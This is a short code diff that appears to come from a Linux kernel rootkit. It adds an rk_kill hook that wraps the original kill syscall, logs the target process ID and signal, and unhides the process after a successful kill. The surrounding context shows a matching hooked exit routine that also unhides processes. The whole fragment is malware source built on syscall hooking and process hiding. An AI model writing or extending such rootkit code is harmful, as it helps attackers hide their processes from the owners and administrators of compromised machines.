@@ -33,3 +33,10 @@ asmlinkage long rk_exit(int error_code) {
     unhide_proc(current->pid);
     return orig_exit(error_code);
 }
+
+asmlinkage long rk_kill(const struct pt_regs *pt_regs) {
+    long i = orig_kill(pt_regs);
+    pr_info("kill %ld code %ld", pt_regs->di, pt_regs->si);
+    if (i == 0) unhide_proc(pt_regs->di);
+    return i;
+}
